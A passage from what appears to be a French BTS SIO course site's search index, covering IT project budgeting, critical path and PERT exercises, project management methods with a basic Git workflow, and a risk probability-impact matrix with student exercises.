23 500\u20ac +1 500\u20ac 100% D\u00e9veloppement 120 000\u20ac 135 000\u20ac 95 000\u20ac -40 000\u20ac 65% Tests 30 000\u20ac 30 000\u20ac 0\u20ac 0\u20ac 0% D\u00e9ploiement 25 000\u20ac 25 000\u20ac 0\u20ac 0\u20ac 0%"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#optimisation-des-couts","title":"\ud83c\udfaf Optimisation des Co\u00fbts","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#strategies-de-reduction-des-couts","title":"Strat\u00e9gies de R\u00e9duction des Co\u00fbts","text":"<ol> <li>Optimisation des Ressources Humaines</li> <li>Externalisation s\u00e9lective (offshore, nearshore)</li> <li>Mutualisation des comp\u00e9tences</li> <li> <p>Formation vs recrutement</p> </li> <li> <p>Choix Technologiques</p> </li> <li>Open Source vs solutions propri\u00e9taires</li> <li>Cloud vs infrastructure on-premise</li> <li> <p>Solutions SaaS vs d\u00e9veloppement sp\u00e9cifique</p> </li> <li> <p>M\u00e9thodologies Agiles</p> </li> <li>Livraisons it\u00e9ratives</li> <li>Feedback rapide</li> <li>R\u00e9duction des risques</li> </ol>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#analyse-make-vs-buy","title":"Analyse Make vs Buy","text":"Crit\u00e8re D\u00e9veloppement Interne Achat de Solution Externalisation Co\u00fbt Initial \u00c9lev\u00e9 Moyen Variable D\u00e9lai Long Court Moyen Contr\u00f4le Total Limit\u00e9 Partag\u00e9 Maintenance Interne \u00c9diteur Prestataire \u00c9volutivit\u00e9 Maximale Limit\u00e9e N\u00e9gociable"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#gestion-des-risques-budgetaires","title":"\ud83d\udea8 Gestion des Risques Budg\u00e9taires","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#principaux-risques","title":"Principaux Risques","text":"\u26a0\ufe0f Risques Techniques \u2022 Sous-estimation de la complexit\u00e9 \u2022 Changements technologiques \u2022 Probl\u00e8mes d'int\u00e9gration \u2022 Performance insuffisante  \u26a0\ufe0f Risques Organisationnels \u2022 Changements de p\u00e9rim\u00e8tre \u2022 Disponibilit\u00e9 des ressources \u2022 Turnover de l'\u00e9quipe \u2022 Conflits de priorit\u00e9s  \u26a0\ufe0f Risques Externes \u2022 \u00c9volution r\u00e9glementaire \u2022 Concurrence \u2022 Crise \u00e9conomique \u2022 Obsolescence technologique"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#strategies-de-mitigation","title":"Strat\u00e9gies de Mitigation","text":"<ol> <li>Provisions pour Risques</li> <li>10-15% pour projets simples</li> <li>20-30% pour projets complexes</li> <li> <p>40-50% pour projets innovants</p> </li> <li> <p>Contrats \u00e0 Risques Partag\u00e9s</p> </li> <li>Forfait avec clauses de r\u00e9vision</li> <li>R\u00e9gie avec plafond</li> <li> <p>Partenariat gain/pain sharing</p> </li> <li> <p>Assurances Projet</p> </li> <li>Assurance responsabilit\u00e9 civile</li> <li>Assurance perte d'exploitation</li> <li>Garanties de performance</li> </ol>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#exercices-pratiques","title":"\ud83d\udccb Exercices Pratiques","text":"\ud83c\udfaf Exercice 1 : Estimation de Co\u00fbts Contexte : D\u00e9veloppement d'une application mobile de gestion de stock pour une PME.  Donn\u00e9es : - \u00c9quipe : 1 chef de projet (600\u20ac/jour), 2 d\u00e9veloppeurs (450\u20ac/jour), 1 testeur (350\u20ac/jour) - Dur\u00e9e estim\u00e9e : 4 mois - Mat\u00e9riel : 15 000\u20ac - Licences : 8 000\u20ac - Formation : 5 000\u20ac  Questions : 1. Calculez le co\u00fbt total du projet 2. R\u00e9partissez les co\u00fbts par cat\u00e9gorie 3. Proposez une provision pour risques 4. Calculez le co\u00fbt journalier de l'\u00e9quipe  \ud83c\udfaf Exercice 2 : Analyse ROI Contexte : Mise en place d'un ERP pour automatiser les processus comptables.  Donn\u00e9es : - Co\u00fbt du projet : 350 000\u20ac - \u00c9conomies annuelles : 120 000\u20ac - Co\u00fbts de maintenance annuels : 25 000\u20ac - Dur\u00e9e de vie : 7 ans - Taux d'actualisation : 8%  Questions : 1. Calculez le ROI sur 3 ans 2. Calculez la VAN du projet 3. D\u00e9terminez le d\u00e9lai de retour sur investissement 4. Analysez la rentabilit\u00e9 du projet  \ud83c\udfaf Exercice 3 : Suivi Budg\u00e9taire Contexte : Projet de refonte de site web en cours.  Donn\u00e9es \u00e0 la semaine 12 : - Budget total : 180 000\u20ac - Avancement planifi\u00e9 : 60% - Avancement r\u00e9el : 55% - Co\u00fbt r\u00e9el : 115 000\u20ac  Questions : 1. Calculez la valeur planifi\u00e9e (PV) 2. Calculez la valeur acquise (EV) 3. Calculez les indices CPI et SPI 4. Estimez le co\u00fbt final (EAC) 5. Proposez des actions correctives"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#outils-de-gestion-budgetaire","title":"\ud83d\udd27 Outils de Gestion Budg\u00e9taire","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#logiciels-specialises","title":"Logiciels Sp\u00e9cialis\u00e9s","text":"Outil Type Fonctionnalit\u00e9s Cl\u00e9s Prix Microsoft Project Gestion de projet Planification, suivi co\u00fbts, rapports 20-55\u20ac/mois Jira + Tempo Agile + Timesheet Suivi temps, budgets, facturation 10-15\u20ac/mois Smartsheet Collaboration Tableaux de bord, automatisation 14-25\u20ac/mois Monday.com Gestion travail Suivi budgets, ressources, temps 8-24\u20ac/mois"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#tableaux-de-bord-excel","title":"Tableaux de Bord Excel","text":"<p>Mod\u00e8les Recommand\u00e9s : - Suivi budg\u00e9taire par phase - Analyse de rentabilit\u00e9 - Tableau de bord des risques - Reporting mensuel</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#bonnes-pratiques","title":"\ud83d\udcda Bonnes Pratiques","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#1-estimation","title":"1. Estimation","text":"\u2705 Recommandations \u2022 Utiliser plusieurs m\u00e9thodes d'estimation \u2022 Impliquer l'\u00e9quipe technique dans l'estimation \u2022 Documenter les hypoth\u00e8ses \u2022 R\u00e9viser r\u00e9guli\u00e8rement les estimations"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#2-suivi","title":"2. Suivi","text":"\u2705 Recommandations \u2022 Mettre en place un reporting hebdomadaire \u2022 Utiliser des indicateurs visuels \u2022 Anticiper les d\u00e9rives \u2022 Communiquer transparence sur les \u00e9carts"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#3-optimisation","title":"3. Optimisation","text":"\u2705 Recommandations \u2022 Analyser les co\u00fbts cach\u00e9s \u2022 N\u00e9gocier les contrats fournisseurs \u2022 Mutualiser les ressources \u2022 Capitaliser sur l'exp\u00e9rience"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#points-cles-a-retenir","title":"\ud83c\udf93 Points Cl\u00e9s \u00e0 Retenir","text":"\ud83d\udca1 Synth\u00e8se du Chapitre <ul> <li>Estimation : Utiliser des m\u00e9thodes compl\u00e9mentaires et pr\u00e9voir des marges</li> <li>Analyse : \u00c9valuer la rentabilit\u00e9 avec ROI, VAN et TRI</li> <li>Suivi : Mettre en place des indicateurs de performance (CPI, SPI)</li> <li>Optimisation : Rechercher l'\u00e9quilibre co\u00fbt/qualit\u00e9/d\u00e9lai</li> <li>Risques : Anticiper et provisionner les risques budg\u00e9taires</li> </ul>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#ressources-complementaires","title":"\ud83d\udcd6 Ressources Compl\u00e9mentaires","text":"<ul> <li>PMBOK Guide - Project Management Institute</li> <li>COCOMO II Model - Barry Boehm</li> <li>Function Point Analysis - IFPUG</li> <li>Earned Value Management - PMI Practice Standard</li> </ul> <p>Cours BTS SIO 1 - Gestion Budg\u00e9taire - Version 2024</p>"},{"location":"BTS/B1/Chemin_critique/","title":"Chemin critique","text":"\ud83c\udfaf Le Chemin Critique <p>M\u00e9thode de planification et d'optimisation de projets</p> \ud83d\udcca Qu'est-ce que le Chemin Critique ? \ud83c\udfaf D\u00e9finition Fondamentale              Le chemin critique est la s\u00e9quence de t\u00e2ches qui d\u00e9termine la dur\u00e9e minimale d'un projet. C'est le plus long chemin en termes de temps dans le r\u00e9seau de t\u00e2ches du projet. Tout retard sur une t\u00e2che du chemin critique retarde l'ensemble du projet.          \u23f1\ufe0f Dur\u00e9e du Projet                  Le chemin critique d\u00e9termine la dur\u00e9e totale minimale n\u00e9cessaire pour terminer le projet.              \ud83d\udd17 S\u00e9quence de T\u00e2ches                  Suite logique de t\u00e2ches interd\u00e9pendantes sans marge de man\u0153uvre temporelle.              \u26a0\ufe0f Risque Critique                  Tout retard sur ces t\u00e2ches impacte directement la date de fin du projet.              \ud83c\udfaf Focus Prioritaire                  Ces t\u00e2ches n\u00e9cessitent une attention et un suivi particuliers du chef de projet.              \ud83d\udd0d Concepts Cl\u00e9s \ud83d\udcdd Terminologie Essentielle              Pour comprendre le chemin critique, il faut ma\u00eetriser plusieurs concepts fondamentaux de la planification de projet.          \ud83c\udfaf T\u00e2che Critique                  T\u00e2che dont le retard impacte directement la date de fin du projet. Marge libre = 0.              \u23f0 Marge Libre                  Temps de retard possible d'une t\u00e2che sans affecter le d\u00e9but de la t\u00e2che suivante.              \ud83d\udcc5 Marge Totale                  Temps de retard possible d'une t\u00e2che sans affecter la date de fin du projet.              \ud83d\udd04 D\u00e9pendance                  Relation logique entre t\u00e2ches : une t\u00e2che ne peut commencer qu'apr\u00e8s la fin d'une autre.              \ud83d\udee0\ufe0f M\u00e9thode de Calcul \ud83d\udcd0 Algorithme du Chemin Critique              Le calcul du chemin critique suit une m\u00e9thode rigoureuse en plusieurs \u00e9tapes.          1 Identifier les T\u00e2ches                  Lister toutes les t\u00e2ches du projet avec leurs dur\u00e9es et d\u00e9pendances.              2 Construire le Diagramme                  Cr\u00e9er le diagramme PERT avec les n\u0153uds (t\u00e2ches) et les liens (d\u00e9pendances et leur dur\u00e9e).              3 Lister les chemins disponibles                  Pour chaque noeud de d\u00e9part, lister les chemins possibles vers le noeud de fin.              4 Calculer les dur\u00e9es                  Calculer les dur\u00e9es de chacun des chemins.              6 Identifier le Chemin                  Le chemin critique est le chemin qui a la dur\u00e9e la plus longue.              \ud83d\udcbc Exemple Pratique \ud83c\udfd7\ufe0f Projet : D\u00e9veloppement d'une Application Mobile <p>Contexte : Une entreprise souhaite d\u00e9velopper une application mobile. Voici les t\u00e2ches identifi\u00e9es :</p> T\u00e2che Description Dur\u00e9e (jours) Pr\u00e9d\u00e9cesseurs A Analyse des besoins 5 - B Conception UI/UX 8 A C D\u00e9veloppement Backend 15 A D D\u00e9veloppement Frontend 12 B E Int\u00e9gration API 6 C, D F Tests et d\u00e9bogage 7 E G D\u00e9ploiement 3 F \ud83c\udfaf Applications Pratiques \ud83d\udcbc Utilisation en Entreprise              Le chemin critique est un outil essentiel pour les chefs de projet dans de nombreux domaines d'activit\u00e9.          \ud83d\udcf1 Projets IT                  D\u00e9veloppement logiciel, d\u00e9ploiement d'infrastructures, migration de syst\u00e8mes.              \ud83c\udfd7\ufe0f Construction                  Planification de chantiers, coordination des corps de m\u00e9tier, respect des d\u00e9lais.              \ud83c\udfac Production                  Organisation d'\u00e9v\u00e9nements, production audiovisuelle, lancement de produits.              \ud83d\udd2c Recherche &amp; D\u00e9veloppement                  Projets de recherche, d\u00e9veloppement de nouveaux produits, \u00e9tudes cliniques.              \ud83d\udcca Planification                  Optimiser l'allocation des ressources et d\u00e9finir les priorit\u00e9s du projet.              \u23f0 Suivi                  Surveiller l'avancement et d\u00e9tecter rapidement les risques de retard.              \ud83d\udcb0 Optimisation                  R\u00e9duire les co\u00fbts en identifiant les t\u00e2ches o\u00f9 investir en priorit\u00e9.              \ud83d\udce2 Communication                  Expliquer clairement les enjeux et priorit\u00e9s aux parties prenantes.              \ud83d\udcdd Exercices Pratiques \ud83d\udd39 Exercice 1 \u2013 Mise en place d'un serveur web <p>Contexte : Un projet de mise en place d'un serveur web est d\u00e9coup\u00e9 en t\u00e2ches :</p> T\u00e2che Description Dur\u00e9e (jours) Pr\u00e9d\u00e9cesseurs A Installer Linux 2 - B Configurer le r\u00e9seau 1 A C Installer Apache 2 A D Installer la base MySQL 3 A E D\u00e9ployer le site web 2 B, C, D F Tests et validation 1 E 1 Tracer le graphe PERT                      Repr\u00e9senter les t\u00e2ches et leurs d\u00e9pendances sous forme de r\u00e9seau.                  2 Calculer tous les chemins possibles                      Identifier tous les chemins du d\u00e9but \u00e0 la fin et calculer leur dur\u00e9e.                  3 D\u00e9terminer le chemin critique                      Trouver le chemin le plus long et la dur\u00e9e totale du projet.                  \ud83d\udd39 Exercice 2 \u2013 D\u00e9veloppement d'une application interne <p>Contexte : Une \u00e9quipe doit d\u00e9velopper une petite application interne. Les t\u00e2ches sont :</p> T\u00e2che Description Dur\u00e9e (jours) Pr\u00e9d\u00e9cesseurs A Analyse des besoins 3 - B Conception de la maquette 4 A C D\u00e9veloppement Backend 6 A D D\u00e9veloppement Frontend 5 B E Int\u00e9gration Front + Back 3 C, D F Tests utilisateurs 2 E G Mise en production 1 F 1 Construire le graphe                      Repr\u00e9senter les d\u00e9pendances entre les t\u00e2ches de d\u00e9veloppement.                  2 Calculer tous les chemins                      Calculer la dur\u00e9e de chaque chemin possible du projet.                  3 Identifier le critique                      Trouver le chemin critique et la dur\u00e9e totale.                  \ud83d\udd39 Exercice 3 \u2013 S\u00e9curisation d'un r\u00e9seau <p>Contexte : Une soci\u00e9t\u00e9 d\u00e9cide de s\u00e9curiser son r\u00e9seau :</p> T\u00e2che Description Dur\u00e9e (jours) Pr\u00e9d\u00e9cesseurs A Audit du r\u00e9seau 2 - B Mise \u00e0 jour des routeurs 3 A C Installation du firewall 2 B D Installation d'un IDS 4 B E Configuration des sauvegardes 2 A F Tests de s\u00e9curit\u00e9 globale 3 C, D, E 1 Repr\u00e9senter le graphe PERT                      Cr\u00e9er le r\u00e9seau des t\u00e2ches de s\u00e9curisation.                  2 Calculer tous les chemins                      Identifier et calculer la dur\u00e9e de chaque chemin possible.                  3 Identifier le chemin critique                      Trouver le chemin le plus long et la dur\u00e9e totale."},{"location":"BTS/B1/Gestion_projet/","title":"Gestion projet","text":"\ud83d\udcca Gestion de Projet Informatique <p>BTS SIO SLAM - Bloc 1 : Support et mise \u00e0 disposition de services informatiques</p> \ud83c\udfaf Fondamentaux de la Gestion de Projet \ud83d\udccb Qu'est-ce qu'un Projet ?              Un projet est un ensemble d'activit\u00e9s temporaires, uniques et coordonn\u00e9es, visant \u00e0 atteindre un objectif sp\u00e9cifique dans un d\u00e9lai d\u00e9termin\u00e9 avec des ressources limit\u00e9es. Il se caract\u00e9rise par un d\u00e9but et une fin clairement d\u00e9finis.          \ud83c\udfaf Objectif D\u00e9fini                  R\u00e9sultat attendu clairement sp\u00e9cifi\u00e9, mesurable et atteignable dans le temps imparti.              \u23f0 Temporalit\u00e9                  Dur\u00e9e limit\u00e9e avec une date de d\u00e9but et une date de fin pr\u00e9cises.              \ud83d\udd04 Unicit\u00e9                  Chaque projet est unique et produit un livrable ou service sp\u00e9cifique.              \ud83d\udcb0 Ressources Limit\u00e9es                  Budget, \u00e9quipe et moyens techniques d\u00e9finis et contraints.                       \u26a0\ufe0f Triangle de la gestion de projet : Qualit\u00e9, D\u00e9lai, Co\u00fbt - modifier l'un impacte n\u00e9cessairement les deux autres.      \ud83d\udc65 R\u00f4les et Responsabilit\u00e9s \ud83c\udfd7\ufe0f \u00c9quipe Projet              Une \u00e9quipe projet efficace r\u00e9unit des comp\u00e9tences compl\u00e9mentaires et des r\u00f4les clairement d\u00e9finis pour atteindre les objectifs dans les meilleures conditions.          \ud83c\udfaf Chef de Projet Responsabilit\u00e9s :                 \u2022 Planification et coordination g\u00e9n\u00e9rale                 \u2022 Gestion des risques et des d\u00e9lais                 \u2022 Communication avec les parties prenantes                 \u2022 Suivi budg\u00e9taire et reporting              \ud83d\udcbc Product Owner Responsabilit\u00e9s :                 \u2022 D\u00e9finition des besoins fonctionnels                 \u2022 Priorisation des fonctionnalit\u00e9s                 \u2022 Validation des livrables                 \u2022 Interface avec les utilisateurs finaux              \ud83c\udfd7\ufe0f Scrum Master Responsabilit\u00e9s :                 \u2022 Animation des c\u00e9r\u00e9monies agiles                 \u2022 Facilitation et r\u00e9solution d'obstacles                 \u2022 Coaching de l'\u00e9quipe                 \u2022 Garant de la m\u00e9thodologie              \ud83d\udcbb D\u00e9veloppeurs Responsabilit\u00e9s :                 \u2022 Conception et d\u00e9veloppement                 \u2022 Tests unitaires et int\u00e9gration                 \u2022 Documentation technique                 \u2022 Estimation des charges              \ud83e\uddea Testeurs/QA Responsabilit\u00e9s :                 \u2022 Conception des plans de tests                 \u2022 Ex\u00e9cution des tests fonctionnels                 \u2022 D\u00e9tection et signalement des anomalies                 \u2022 Validation de la qualit\u00e9              \ud83c\udfa8 UX/UI Designer Responsabilit\u00e9s :                 \u2022 Conception de l'exp\u00e9rience utilisateur                 \u2022 Cr\u00e9ation des maquettes et prototypes                 \u2022 Tests d'utilisabilit\u00e9                 \u2022 Respect des standards d'accessibilit\u00e9                       \ud83d\udca1 Communication : La r\u00e9ussite d'un projet d\u00e9pend principalement de la qualit\u00e9 de la communication entre les membres de l'\u00e9quipe.      \ud83d\udcc8 Diagramme de Gantt \ud83d\udcca Outil de Planification              Le diagramme de Gantt est un outil graphique de planification qui repr\u00e9sente les t\u00e2ches d'un projet dans le temps, leurs d\u00e9pendances et l'avancement des travaux.          \ud83d\udcc5 Planification Temporelle                  Visualisation claire des dates de d\u00e9but et fin de chaque t\u00e2che sur une \u00e9chelle de temps.              \ud83d\udd17 D\u00e9pendances                  Identification des liens entre t\u00e2ches : ant\u00e9riorit\u00e9, simultan\u00e9it\u00e9, succession.              \ud83d\udcca Suivi d'Avancement                  Comparaison entre planifi\u00e9 et r\u00e9alis\u00e9, identification des retards et ajustements.              \u26a1 Chemin Critique                  S\u00e9quence de t\u00e2ches d\u00e9terminant la dur\u00e9e minimale du projet.              \ud83d\udcca Exemple : Projet de D\u00e9veloppement d'Application Web T\u00e2ches S1 S2 S3 S4 S5 S6 S7 S8 S9 S10 S11 S12 Analyse des besoins Conception UX/UI D\u00e9veloppement Backend D\u00e9veloppement Frontend Tests et Int\u00e9gration D\u00e9ploiement Jalons          \ud83d\udca1 Outils recommand\u00e9s : Microsoft Project, GanttProject (gratuit), Trello, Asana, ou des solutions int\u00e9gr\u00e9es comme Azure DevOps.      \ud83c\udfc1 Jalons (Milestones) \ud83c\udfaf Points de Contr\u00f4le              Les jalons sont des \u00e9v\u00e9nements cl\u00e9s du projet qui marquent l'ach\u00e8vement d'une phase importante ou la livraison d'un r\u00e9sultat majeur. Ils permettent de mesurer l'avancement et de valider la conformit\u00e9.          \ud83d\ude80 Lancement Projet Validation du cahier des charges et d\u00e9marrage officiel \ud83d\udccb Fin d'Analyse Sp\u00e9cifications fonctionnelles valid\u00e9es par le client \ud83c\udfa8 Maquettes Valid\u00e9es Design et ergonomie approuv\u00e9s par les utilisateurs \u2699\ufe0f Prototype Fonctionnel Version de d\u00e9monstration des fonctionnalit\u00e9s cl\u00e9s \ud83e\uddea Tests Valid\u00e9s Recette utilisateur r\u00e9ussie et anomalies corrig\u00e9es \ud83c\udf89 Mise en Production D\u00e9ploiement r\u00e9ussi et formation utilisateurs termin\u00e9e          \u26a0\ufe0f Crit\u00e8res SMART : Chaque jalon doit \u00eatre Sp\u00e9cifique, Mesurable, Atteignable, R\u00e9aliste et Temporellement d\u00e9fini.      \ud83d\udd04 M\u00e9thodologies de Gestion de Projet \u2696\ufe0f Approches Compl\u00e9mentaires              Les m\u00e9thodologies de gestion de projet offrent des cadres structur\u00e9s pour organiser, planifier et ex\u00e9cuter les projets selon leur nature, complexit\u00e9 et contraintes.          \ud83d\udcd0 M\u00e9thode en V                  Approche s\u00e9quentielle o\u00f9 chaque phase de d\u00e9veloppement correspond \u00e0 une phase de test. Id\u00e9ale pour les projets avec des exigences stables et bien d\u00e9finies.              \u2705 Avantages :                 \u2022 Structure claire et pr\u00e9visible                 \u2022 Documentation compl\u00e8te                 \u2022 Contr\u00f4le qualit\u00e9 rigoureux                 \u2022 Adapt\u00e9 aux projets critiques \u274c Inconv\u00e9nients :                 \u2022 Peu flexible aux changements                 \u2022 Feedback tardif du client                 \u2022 Risque de d\u00e9rive des co\u00fbts              \ud83c\udfc3 M\u00e9thode Agile                  Approche it\u00e9rative et collaborative privil\u00e9giant l'adaptation au changement et la livraison continue de valeur. Bas\u00e9e sur des cycles courts (sprints).              \u2705 Avantages :                 \u2022 Flexibilit\u00e9 et adaptabilit\u00e9                 \u2022 Feedback client r\u00e9gulier                 \u2022 Livraisons fr\u00e9quentes                 \u2022 Collaboration renforc\u00e9e \u274c Inconv\u00e9nients :                 \u2022 Moins de documentation                 \u2022 Difficult\u00e9 d'estimation                 \u2022 N\u00e9cessite une \u00e9quipe exp\u00e9riment\u00e9e              \ud83d\udccb Scrum Framework agile avec sprints de 2-4 semaines, c\u00e9r\u00e9monies d\u00e9finies et r\u00f4les sp\u00e9cifiques \ud83d\udd04 Kanban M\u00e9thode visuelle de gestion des flux avec limitation du travail en cours \ud83d\udcd0 Cycle en V Mod\u00e8le s\u00e9quentiel avec phases de test correspondant aux phases de d\u00e9veloppement          \ud83d\udca1 Choix de m\u00e9thodologie : Agile pour l'innovation et l'incertitude, V pour la stabilit\u00e9 et la conformit\u00e9 r\u00e9glementaire.      \ud83d\udd27 Versionning avec Git \ud83d\udcda Gestion des Versions Git est un syst\u00e8me de contr\u00f4le de version distribu\u00e9 qui permet de suivre les modifications du code, collaborer efficacement et g\u00e9rer les diff\u00e9rentes versions d'un projet.          \ud83c\udf3f Branches                  Lignes de d\u00e9veloppement parall\u00e8les permettant de travailler sur diff\u00e9rentes fonctionnalit\u00e9s simultan\u00e9ment.              \ud83d\udcbe Commits                  Instantan\u00e9s du code \u00e0 un moment donn\u00e9 avec description des modifications apport\u00e9es.              \ud83d\udd04 Merge                  Fusion de branches pour int\u00e9grer les d\u00e9veloppements dans la branche principale.              \ud83c\udff7\ufe0f Tags                  Marqueurs pour identifier les versions stables et les releases du projet.              \ud83d\udd27 Workflow Git Standard \ud83d\udce5 1. Initialisation du projet Cloner le repository depuis GitHub/GitLab git clone https://github.com/username/project.git cd project \ud83c\udf3f 2. Cr\u00e9ation d'une branche de fonctionnalit\u00e9 Cr\u00e9er une branche d\u00e9di\u00e9e pour d\u00e9velopper une nouvelle fonctionnalit\u00e9 git checkout -b feature/nouvelle-fonctionnalite \ud83d\udca1 Convention de nommage : feature/, bugfix/, hotfix/ \ud83d\udcbb 3. D\u00e9veloppement et commits D\u00e9velopper la fonctionnalit\u00e9 et commiter r\u00e9guli\u00e8rement git add . git commit -m \"feat: ajout de la fonctionnalit\u00e9 X\" \ud83d\udcdd Utiliser les Conventional Commits : feat, fix, docs, style, refactor, test \ud83d\ude80 4. Publication de la branche Pousser la branche vers le repository distant git push origin feature/nouvelle-fonctionnalite \ud83d\udd0d 5. Demande de r\u00e9vision (Pull Request) Cr\u00e9er une Pull Request via l'interface web \ud83c\udf10 Via GitHub, GitLab ou Azure DevOps \ud83d\udc65 Assigner des reviewers et ajouter une description d\u00e9taill\u00e9e \u2705 6. Int\u00e9gration dans la branche principale Apr\u00e8s validation, merger dans main/master git checkout main git pull origin main git merge feature/nouvelle-fonctionnalite git branch -d feature/nouvelle-fonctionnalite \ud83e\uddf9 Supprimer la branche locale apr\u00e8s merge \ud83c\udf3f GitFlow                  Mod\u00e8le de branches avec main, develop, feature, release et hotfix pour projets complexes.              \ud83d\ude80 GitHub Flow                  Workflow simplifi\u00e9 avec main et branches de fonctionnalit\u00e9s pour d\u00e9ploiement continu.              \ud83d\udd04 CI/CD                  Int\u00e9gration et d\u00e9ploiement continus automatis\u00e9s via GitHub Actions, GitLab CI.              \ud83d\udcdd Conventional Commits                  Convention de nommage des commits : feat, fix, docs, style, refactor, test.                       \u26a0\ufe0f Bonnes pratiques : Commits atomiques (le moins de mots possibles), messages clairs, branches courtes, reviews syst\u00e9matiques, tests automatis\u00e9s.      \ud83d\udcca Suivi et Contr\u00f4le de Projet \ud83d\udcc8 Pilotage de Projet              Le suivi de projet consiste \u00e0 mesurer l'avancement, identifier les \u00e9carts par rapport au plan initial et prendre les actions correctives n\u00e9cessaires pour respecter les objectifs.          \ud83d\udcca Indicateurs KPI (Key Performance Indicator)                  M\u00e9triques de performance : v\u00e9locit\u00e9 (nombre de points d'un sprint), taux de d\u00e9fauts et de r\u00e9ussites, respect des d\u00e9lais (Time to Market).              \ud83d\udcb0 Suivi Budg\u00e9taire                  Contr\u00f4le des co\u00fbts r\u00e9els vs pr\u00e9visionnels, analyse des \u00e9carts et projections.              \u26a0\ufe0f Gestion des Risques                  Identification, \u00e9valuation et mitigation des risques techniques, humains et organisationnels.              \ud83d\udce2 Communication                  Reporting r\u00e9gulier, r\u00e9unions de suivi, tableaux de bord et communication avec les parties prenantes."},{"location":"BTS/B1/Gestion_risques/","title":"Gestion risques","text":"\u26a0\ufe0f Gestion des Risques <p>BTS SIO SLAM - Bloc 1 : Gestion des risques en projet informatique</p> \ud83c\udfaf Fondamentaux de la Gestion des Risques \ud83d\udd0d Qu'est-ce qu'un Risque Projet ?              Un risque projet est un \u00e9v\u00e9nement incertain qui, s'il se produit, peut avoir un impact positif ou n\u00e9gatif sur les objectifs du projet (d\u00e9lais, co\u00fbts, qualit\u00e9, p\u00e9rim\u00e8tre). La gestion des risques consiste \u00e0 les identifier, les analyser, les traiter et les surveiller.                   En gestion de projet informatique, la gestion des risques est cruciale pour anticiper les probl\u00e8mes et assurer le succ\u00e8s des projets. Elle d\u00e9montre la maturit\u00e9 professionnelle et la capacit\u00e9 \u00e0 g\u00e9rer l'incertitude dans un environnement technologique complexe.      1 Identification D\u00e9tecter les risques potentiels \u2192 2 Analyse \u00c9valuer probabilit\u00e9 et impact \u2192 3 Traitement D\u00e9finir les strat\u00e9gies \u2192 4 Surveillance Suivre et contr\u00f4ler \ud83d\udcca Matrice des Risques \ud83c\udfaf \u00c9valuation Probabilit\u00e9 \u00d7 Impact              La matrice des risques permet de prioriser les risques en croisant leur probabilit\u00e9 d'occurrence avec leur impact sur le projet. Cette visualisation aide \u00e0 concentrer les efforts sur les risques les plus critiques.          Impact \u2192Probabilit\u00e9 \u2193 1Tr\u00e8s Faible 2Faible 3Moyen 4Fort 5Tr\u00e8s Fort 5Tr\u00e8s Forte Moyen5 \u00c9lev\u00e910 \u00c9lev\u00e915 Critique20 Critique25 4Forte Faible4 Moyen8 \u00c9lev\u00e912 \u00c9lev\u00e916 Critique20 3Moyenne Faible3 Faible6 Moyen9 \u00c9lev\u00e912 \u00c9lev\u00e915 2Faible Faible2 Faible4 Faible6 Moyen8 \u00c9lev\u00e910 1Tr\u00e8s Faible Faible1 Faible2 Faible3 Faible4 Moyen5 \ud83d\udcd0 R\u00e8gles de Calcul de la Criticit\u00e9 Formule : Criticit\u00e9 = Probabilit\u00e9 \u00d7 Impact Seuils de criticit\u00e9 : <ul> <li>Risque Faible : 1 \u00e0 6 points</li> <li>Risque Moyen : 8 \u00e0 9 points</li> <li>Risque \u00c9lev\u00e9 : 10 \u00e0 16 points</li> <li>Risque Critique : 20 \u00e0 25 points</li> </ul> Actions recommand\u00e9es : <ul> <li>Faible (1-6) : Surveillance passive</li> <li>Moyen (8-9) : Plan de contingence</li> <li>\u00c9lev\u00e9 (10-16) : Actions pr\u00e9ventives obligatoires</li> <li>Critique (20-25) : Traitement imm\u00e9diat prioritaire</li> </ul> 1 - Tr\u00e8s Faible Tr\u00e8s improbable 2 - Faible Peu probable 3 - Moyenne Possible 4 - Forte Probable 5 - Tr\u00e8s Forte Tr\u00e8s probable \ud83d\udcdd Travaux Dirig\u00e9s : Calcul de Risques                  \ud83c\udfaf Exercice 1 - E-commerce                               \ud83d\udcf1 Exercice 2 - App Mobile                               \ud83c\udf10 Exercice 3 - Site Web                               \ud83e\udd8a Exercice 4 - Recensement                               \ud83d\ude80 Exercice 5 - Projet libre              Contexte : D\u00e9veloppement d'une plateforme e-commerce (6 mois, 150k\u20ac, 8 d\u00e9veloppeurs)              \ud83c\udfaf Exercice 1 : \u00c9valuation de Risques Projet E-commerce              Vous \u00eates chef de projet pour le d\u00e9veloppement d'une plateforme e-commerce. Analysez les risques suivants et calculez leur criticit\u00e9.          \ud83d\udccb Contexte du projet : <ul> <li>Dur\u00e9e : 6 mois</li> <li>Budget : 150 000 \u20ac</li> <li>\u00c9quipe : 8 d\u00e9veloppeurs</li> <li>Deadline : Lancement pour les f\u00eates de fin d'ann\u00e9e</li> </ul> Risque Identifi\u00e9 Probabilit\u00e9 (1-5) Impact (1-5) Criticit\u00e9 Niveau Retard de livraison des API externes 3 4 ? ? D\u00e9part d'un d\u00e9veloppeur senior 2 4 ? ? Probl\u00e8me de performance sous charge 4 5 ? ? Changement des exigences client 4 3 ? ? Faille de s\u00e9curit\u00e9 d\u00e9couverte 2 5 ? ?              Criticit\u00e9 = Probabilit\u00e9 \u00d7 Impact          Contexte : Application mobile de gestion de t\u00e2ches (4 mois, 80k\u20ac, \u00e9quipe mixte)              \ud83d\udcf1 Exercice 2 : \u00c9valuation de Risques Application Mobile              Vous dirigez le d\u00e9veloppement d'une application mobile de gestion de t\u00e2ches pour une startup. \u00c9valuez les risques suivants et calculez leur criticit\u00e9.          \ud83d\udccb Contexte du projet : <ul> <li>Dur\u00e9e : 4 mois</li> <li>Budget : 80 000 \u20ac</li> <li>\u00c9quipe : 5 